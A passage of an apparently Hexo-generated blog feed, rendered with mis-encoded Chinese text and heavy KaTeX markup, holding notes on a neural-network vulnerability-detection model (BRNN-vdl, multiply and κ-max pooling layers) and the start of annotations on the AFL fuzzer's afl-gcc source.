class="mopen">(</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">Ï‰</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">Î²</span><span class="mclose">)</span></span></span></span></span></p><p>å…¶ä¸­Ï‰ä¸ºæƒé‡å‘é‡ï¼ŒÎ²ä¸ºåå·®å‘é‡ï¼Œg<sub>Ï„âˆ’1</sub>(ei)å’Œg<sub>Ï„+1</sub>(ei)åˆ†åˆ«ä¸ºBRNNå±‚åœ¨æ—¶é—´é˜¶é•¿Ï„âˆ’1å’ŒÏ„+1æ—¶çš„è¾“å‡ºï¼Œå‡½æ•°Ï†è¡¨ç¤ºBRNNå±‚çš„è¾“å‡ºç”±å…¶å‚æ•°g<sub>Ï„âˆ’1</sub>(e<sub>i</sub>)ã€g<sub>Ï„+1</sub>(e<sub>i</sub>)ã€e<sub>i</sub>ã€Ï‰å’ŒÎ²è¡¨ç¤ºã€‚è¿™äº›å‚æ•°å¦‚ä½•ç›¸äº’ä½œç”¨å–å†³äºRNNç»†èƒï¼Œå¦‚LSTMå’ŒGRUã€‚å¯¹äºiSeVC  eiï¼Œæ ‡å‡†BRNN Aiçš„è¾“å‡ºå‘é‡(å³æ¿€æ´»å±‚çš„è¾“å‡ºå‘é‡)è¡¨ç¤ºä¸º</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>A</mi><mi>i</mi></msub><mo>=</mo><mo stretchy="false">(</mo><msub><mi>g</mi><mn>1</mn></msub><mo stretchy="false">(</mo><msub><mi>e</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>g</mi><mi>Î»</mi></msub><mo stretchy="false">(</mo><msub><mi>e</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">A_i = (g_1(e_i), . . . , g_Î»(e_i))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">Î»</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></span></p></li></ul><h4 id="ä¹˜æ³•å±‚multiply-layerå®ç°æ³¨æ„åŠ›è·å–"><a class="markdownIt-Anchor" href="#ä¹˜æ³•å±‚multiply-layerå®ç°æ³¨æ„åŠ›è·å–"></a> ä¹˜æ³•å±‚(multiply layer)å®ç°æ³¨æ„åŠ›è·å–</h4><p>ä¸ºäº†ä½¿ç¥ç»ç½‘ç»œèƒ½å¤Ÿé¢„æµ‹æ¼æ´ä½ç½®,ä¹˜æ³•å±‚éœ€è¦æ ¹æ®æ¼æ´ä»£ç è¡Œå¯¹åº”çš„ä»¤ç‰Œä½ç½®å¯¹ä¸åŒçš„<code>iSeVCs</code>è¿›è¡Œä¸åŒçš„å¤„ç†ã€‚</p><ul><li>(i)å¯¹äºæ˜“å—æ”»å‡»çš„<code>iSeVCs</code>ï¼Œä¹˜æ³•å±‚æ„å‘³ç€é€‰æ‹©ä¸æ˜“å—æ”»å‡»çš„ä»£ç è¡Œå¯¹åº”çš„ä»¤ç‰Œçš„è¾“å‡ºã€‚è¿™äº›è¢«é€‰ä¸­çš„è¾“å‡ºå°†åœ¨åç»­çš„å±‚å’ŒBRNN-vdlçš„åå‘ä¼ æ’­è¿‡ç¨‹ä¸­ä½¿ç”¨ï¼Œå› ä¸ºå®ƒä»¬å°†æœ‰åŠ©äºä»¥æ›´é«˜çš„ç²¾åº¦å®šä½æ¼æ´(ç›¸å¯¹äºä¸ä½¿ç”¨è¿™ä¸ªä¹˜æ³•å±‚æ¥è¯´)ã€‚</li><li>(ii)å¯¹äºä¸è„†å¼±çš„<code>iSeVCs</code>ï¼Œä¹˜æ³•å±‚æ˜¯æŒ‡é€‰æ‹©tokençš„æ‰€æœ‰è¾“å‡ºï¼Œå¹¶åœ¨åç»­çš„å±‚å’ŒBRNN-vdlçš„åå‘ä¼ æ’­è¿‡ç¨‹ä¸­ä½¿ç”¨å®ƒä»¬ï¼Œå› ä¸ºè¿™äº›tokenåœ¨å­¦ä¹ é˜¶æ®µåŒæ ·é‡è¦ã€‚</li></ul><p>å½¢å¼ä¸Šï¼Œå¯¹äº<code>iSeVC</code> e<sub>i</sub>ï¼Œä¹˜å±‚å°†æ¿€æ´»å±‚A<sub>i</sub>çš„è¾“å‡ºå‘é‡ä¸æ¼æ´ä½ç½®çŸ©é˜µL<sub>i</sub>ç›¸ä¹˜ã€‚</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>M</mi><mi>i</mi></msub><mo>=</mo><msub><mi>A</mi><mi>i</mi></msub><msub><mi>L</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">M_i = A_iL_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>å…¶ä¸­ï¼ŒL<sub>i</sub>æ˜¯ä¸€ä¸ªå¯¹è§’çŸ©é˜µï¼ŒL<sub>i</sub>= diag(Î±<sub>1</sub>ï¼Œ  Î±<sub>2</sub>ï¼Œâ€¦,Î±<sub>Î»</sub>)ã€‚å¯¹äºè„†å¼±çš„<code>iSeVC</code>ï¼Œæˆ‘ä»¬ç”¨<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>x</mi><mi>Ïµ</mi><mo mathvariant="normal">â€²</mo></msubsup></mrow><annotation encoding="application/x-tex">x_\epsilon&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.998892em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">Ïµ</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>è¡¨ç¤ºè„†å¼±è¡Œ<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>Ïµ</mi></msub></mrow><annotation encoding="application/x-tex">x_\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">Ïµ</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ä¸­ç¬¬ä¸€ä¸ªä»¤ç‰Œçš„ä½ç½®(1â‰¤<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>Ïµ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">Ïµ</span></span></span></span>â‰¤Î¶)ï¼Œ<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>w</mi><mi>Ïµ</mi></msub></mrow><annotation encoding="application/x-tex">w_\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">Ïµ</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>è¡¨ç¤º<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>Ïµ</mi></msub></mrow><annotation encoding="application/x-tex">x_\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">Ïµ</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ä¸­ä»¤ç‰Œçš„æ•°é‡ã€‚</p><p>å…¶ä¸­ï¼ŒÎ±<sub>Ï†</sub>(1â‰¤Ï†â‰¤Î»)å–å€¼å¦‚ä¸‹:  å¯¹äºæ˜“å—æ”»å‡»çš„<code>iSeVC</code>,å¦‚æœÏ†âˆˆ{<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>x</mi><mi>Ïµ</mi><mo mathvariant="normal">â€²</mo></msubsup></mrow><annotation encoding="application/x-tex">x_\epsilon&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.998892em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">Ïµ</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>â€¦â€¦, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>x</mi><mi>Ïµ</mi><mo mathvariant="normal">â€²</mo></msubsup></mrow><annotation encoding="application/x-tex">x_\epsilon&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.998892em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">Ïµ</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>+ <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>w</mi><mi>Ïµ</mi></msub><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">w_\epsilon-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">Ïµ</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>}ï¼Œç„¶åæˆ‘ä»¬è®¾ç½®Î±<sub>Ï†</sub> = 1;å¦åˆ™ï¼Œæˆ‘ä»¬è®¾ç½®Î± Ï† = 0ã€‚å¯¹äºä¸è„†å¼±çš„<code>iSeVC</code>ï¼Œæˆ‘ä»¬è®¾ç½®Î±<sub>Ï†</sub> = 1(1â‰¤Ï†â‰¤Î»)ã€‚</p><h4 id="Îº-maxæ±‡èšå±‚å’Œå¹³å‡æ±‡èšå±‚å…±åŒå®ç°ç²’åº¦ç»†åŒ–"><a class="markdownIt-Anchor" href="#Îº-maxæ±‡èšå±‚å’Œå¹³å‡æ±‡èšå±‚å…±åŒå®ç°ç²’åº¦ç»†åŒ–"></a> Îº-maxæ±‡èšå±‚å’Œå¹³å‡æ±‡èšå±‚å…±åŒå®ç°ç²’åº¦ç»†åŒ–ã€‚</h4><blockquote><p>Îº-max pooling, and average pooling layers</p></blockquote><p>ä¸ºäº†ä½¿ç”¨åå‘ä¼ æ’­è®­ç»ƒç¥ç»ç½‘ç»œï¼Œéœ€è¦Îº-max poolingå±‚å’Œaverage  poolingå±‚å¯¹multiplyå±‚çš„è¾“å‡ºè¿›è¡Œé€‰æ‹©å’Œå¤„ç†ã€‚Îº-max poolingå±‚é€‰å–Miå±‚è¾“å‡ºå‘é‡ä¸­å„å…ƒç´ çš„Îºæœ€å¤§å€¼ã€‚å¹³å‡poolingå±‚è®¡ç®—Îº-max  poolingå±‚è¾“å‡ºçš„å¹³å‡å€¼ã€‚ç›´è§‚åœ°è¯´ï¼Œè¿™ä¸¤å±‚ä¸€èµ·å®ç°äº†ç²’åº¦ç»†åŒ–ï¼Œ</p><p>æœ‰ä¸¤ä¸ªåŸå› ï¼š</p><ul><li>(i)å®ƒä»¬è¿›ä¸€æ­¥é€‰æ‹©multiplyå±‚çš„è¾“å‡ºï¼Œä»¥è·å¾—å¯¹åº”äºæ¯ä¸ª<code>iSeVC</code>çš„è¾“å‡ºï¼Œç”¨äºåå‘ä¼ æ’­ï¼Œ</li><li>(ii)å®ƒä»¬åŒæ—¶è€ƒè™‘äº†æœ€å¤§å€¼å’Œå¹³å‡å€¼ã€‚</li></ul><p>åœ¨å½¢å¼ä¸Šï¼Œå¯¹äº<code>iSeVC</code> eiï¼Œaverage  poolingå±‚o<sub>i</sub>çš„è¾“å‡ºå®šä¹‰ä¸º</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>o</mi><mi>i</mi></msub><mo>=</mo><mi>a</mi><mi>v</mi><mi>e</mi><mo stretchy="false">(</mo><mi>m</mi><mi>a</mi><msub><mi>x</mi><mi>Îº</mi></msub><mo stretchy="false">(</mo><msub><mi>M</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">o_i =  ave(max_Îº(M_i))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">Îº</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></span></p><p>å…¶ä¸­å‡½æ•°max<sub>Îº</sub>è¿”å›å‘é‡ä¸­kæœ€å¤§çš„å…ƒç´ ï¼Œå‡½æ•°aveè¿”å›kæœ€å¤§å…ƒç´ çš„å¹³å‡å€¼ã€‚è®­ç»ƒè¿‡ç¨‹ç»è¿‡åå¤çš„å‘å‰å’Œå‘åä¼ æ’­ï¼Œæ”¶æ•›ä¸ºä¸€ä¸ªå‚æ•°ç»è¿‡å¾®è°ƒçš„BRNN-vdlï¼Œå¯¹è®­ç»ƒæ•°æ®ä¸­çš„æ¼æ´æ¨¡å¼è¿›è¡Œç¼–ç ã€‚</p><h2 id="44-æ£€æµ‹å’Œå®šä½æ¼æ´"><a class="markdownIt-Anchor" href="#44-æ£€æµ‹å’Œå®šä½æ¼æ´"></a> 4.4 æ£€æµ‹å’Œå®šä½æ¼æ´</h2><p>å›¾6çªå‡ºæ˜¾ç¤ºäº†ä½¿ç”¨å­¦ä¹ åçš„BRNN-vdlæ£€æµ‹å’Œå®šä½ç›®æ ‡ç¨‹åºä¸­çš„æ¼æ´ã€‚</p><p>è¾“å…¥æ˜¯è¡¨ç¤ºä»ç›®æ ‡ç¨‹åºä¸­æå–çš„<code>iSeVC</code>çš„å‘é‡ã€‚æˆ‘ä»¬é¦–å…ˆå¾—åˆ°<code>iSeVCs</code>ä¸­æ ‡è®°å¯¹åº”çš„æ¿€æ´»å±‚çš„è¾“å‡ºï¼Œç„¶åè®¡ç®—æ¯ä¸€è¡Œæ ‡è®°çš„Îºæœ€å¤§è¾“å‡ºå€¼çš„å¹³å‡å€¼ã€‚ç„¶åï¼Œæˆ‘ä»¬æå–è¾“å‡ºå¤§äºé˜ˆå€¼Ï‘çš„ä»£ç è¡Œï¼Œä»è€Œå¯¼è‡´å®¹æ˜“å—åˆ°æ”»å‡»çš„<code>iSeVC</code>å’Œä»£ç è¡Œã€‚æœ€åï¼Œæˆ‘ä»¬å°†æ˜“å—æ”»å‡»çš„<code>iSeVC</code>å’Œå…¶ä¸­æ˜“å—æ”»å‡»çš„ä»£ç è¡Œæ˜ å°„åˆ°æºä»£ç ä¸­ï¼Œä½œä¸ºæ£€æµ‹é˜¶æ®µçš„è¾“å‡ºã€‚</p><p>ä»¥å›¾4(d)ä¸­çš„<code>iSeVC</code>ä¸ºä¾‹ã€‚<code>iSeVC</code>å¯¹åº”çš„å‘é‡æ˜¯å­¦ä¹ åçš„BRNNvdlç¥ç»ç½‘ç»œçš„è¾“å…¥ã€‚è®¡ç®—æ¯è¡Œæ ‡è®°çš„Îºæœ€å¤§è¾“å‡ºå€¼çš„å¹³å‡å€¼åï¼Œ<code>iSeVC</code>è¢«ç¡®å®šä¸ºè„†å¼±çš„ï¼Œä¸­é—´ä»£ç çš„è„†å¼±è¡Œåœ¨å›¾4(d)çš„19-21è¡Œã€‚æœ€åï¼Œå°†<code>iSeVC</code>ä¸­çš„è„†å¼±è¡Œæ˜ å°„åˆ°æºä»£ç ä¸­çš„è„†å¼±è¡Œ(å³å›¾4(a)ä¸­çš„ç¬¬25è¡Œ)ã€‚</p><p><img src="/posts/33f70302/image-20211221102530200.png" alt="image-20211221102530200"></p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¼æ´æ£€æµ‹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFLæºç æ³¨é‡Šï¼ˆå¾…å®Œæˆï¼‰</title>
    <link href="/posts/7e08c437/"/>
    <url>/posts/7e08c437/</url>
    
    <content type="html"><![CDATA[<h1 id="1-afl-gcc"><a class="markdownIt-Anchor" href="#1-afl-gcc"></a> 1. afl-gcc</h1><ul><li><p>ç®€å•å‡½æ•°è§£é‡Š</p><blockquote><ul><li><p><strong>strrchr()</strong></p><p>char *strrchr(const char *str, int c)</p><p>åœ¨å‚æ•° <strong>str</strong> æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ä¸­æœç´¢æœ€åä¸€æ¬¡å‡ºç°å­—ç¬¦ <strong>c</strong>ï¼ˆä¸€ä¸ªæ— ç¬¦å·å­—ç¬¦ï¼‰çš„ä½ç½®ã€‚</p></li><li><p><strong>access()</strong></p><p>int access(const char* pathname, int mode);</p><p>pathname æ˜¯æ–‡ä»¶çš„è·¯å¾„å+æ–‡ä»¶å</p><p>modeï¼šæŒ‡å®šaccessçš„ä½œç”¨ï¼Œå–å€¼å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs undefined">F_OK å€¼ä¸º0ï¼Œåˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨<br>X_OK å€¼ä¸º1ï¼Œåˆ¤æ–­å¯¹æ–‡ä»¶æ˜¯å¯æ‰§è¡Œæƒé™<br>W_OK å€¼ä¸º2ï¼Œåˆ¤æ–­å¯¹æ–‡ä»¶æ˜¯å¦æœ‰å†™æƒé™<br>R_OK å€¼ä¸º4ï¼Œåˆ¤æ–­å¯¹æ–‡ä»¶æ˜¯å¦æœ‰è¯»æƒé™<br></code></pre></div></td></tr></table></figure><p>è¿”å›å€¼ï¼šæˆåŠŸ0ï¼Œå¤±è´¥-1</p></li></ul></blockquote></li></ul><h2 id="find_as"><a class="markdownIt-Anchor" href="#find_as"></a> 